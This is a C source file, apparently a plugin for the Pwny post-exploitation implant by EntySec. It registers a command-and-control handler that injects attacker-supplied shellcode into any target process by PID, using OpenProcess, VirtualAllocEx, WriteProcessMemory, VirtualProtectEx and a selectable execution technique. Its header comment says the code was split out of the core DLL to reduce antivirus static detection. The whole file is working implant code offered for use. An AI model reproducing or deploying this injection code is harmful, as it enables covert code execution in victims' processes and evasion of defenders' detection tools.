/*
 * MIT License
 *
 * Copyright (c) 2020-2024 EntySec
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 */

/*
 * Inject tab plugin — remote shellcode injection.
 *
 * Moved out of the core DLL to reduce the static detection
 * surface. Loaded on demand as a tab DLL via pe_load().
 */

#ifdef __windows__

#include <pwny/tab_dll.h>

#include <windows.h>
#include <pwny/c2.h>
#include <pwny/log.h>

#include <pwny/windows/inject_tech.h>

#define INJECT_BASE 25

#define INJECT_SHELLCODE \
        TLV_TAG_CUSTOM(API_CALL_STATIC, \
                       INJECT_BASE, \
                       API_CALL)

#define TLV_TYPE_INJECT_SC_TECHNIQUE \
        TLV_TYPE_CUSTOM(TLV_TYPE_INT, INJECT_BASE, API_TYPE)

static tlv_pkt_t *inject_shellcode(c2_t *c2)
{
    int pid;
    int size;
    int technique;
    unsigned char *shellcode;
    HANDLE hProcess;
    LPVOID pRemote;
    DWORD dwOldProt;

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_PID, &pid) < 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (tlv_pkt_get_u32(c2->request, TLV_TYPE_INJECT_SC_TECHNIQUE,
                         &technique) < 0)
    {
        technique = INJECT_TECH_DEFAULT;
    }

    size = tlv_pkt_get_bytes(c2->request, TLV_TYPE_BYTES, &shellcode);
    if (size <= 0)
    {
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE, (DWORD)pid
    );

    if (hProcess == NULL)
    {
        log_debug("* inject: OpenProcess(%d) failed (%lu)\n",
                  pid, GetLastError());
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    pRemote = VirtualAllocEx(hProcess, NULL, (SIZE_T)size,
                             MEM_COMMIT | MEM_RESERVE,
                             PAGE_READWRITE);
    if (pRemote == NULL)
    {
        log_debug("* inject: VirtualAllocEx failed (%lu)\n", GetLastError());
        CloseHandle(hProcess);
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!WriteProcessMemory(hProcess, pRemote, shellcode, (SIZE_T)size, NULL))
    {
        log_debug("* inject: WriteProcessMemory failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        free(shellcode);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    free(shellcode);

    if (!VirtualProtectEx(hProcess, pRemote, (SIZE_T)size,
                          PAGE_EXECUTE_READ, &dwOldProt))
    {
        log_debug("* inject: VirtualProtectEx failed (%lu)\n", GetLastError());
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    if (!inject_execute_code(technique, hProcess, (DWORD)pid, pRemote, NULL))
    {
        log_debug("* inject: code execution failed (technique %d)\n",
                  technique);
        VirtualFreeEx(hProcess, pRemote, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return api_craft_tlv_pkt(API_CALL_FAIL, c2->request);
    }

    CloseHandle(hProcess);

    return api_craft_tlv_pkt(API_CALL_SUCCESS, c2->request);
}

TAB_DLL_EXPORT void TabInit(api_calls_t **api_calls)
{
    api_call_register(api_calls, INJECT_SHELLCODE, (api_t)inject_shellcode);
}

#endif
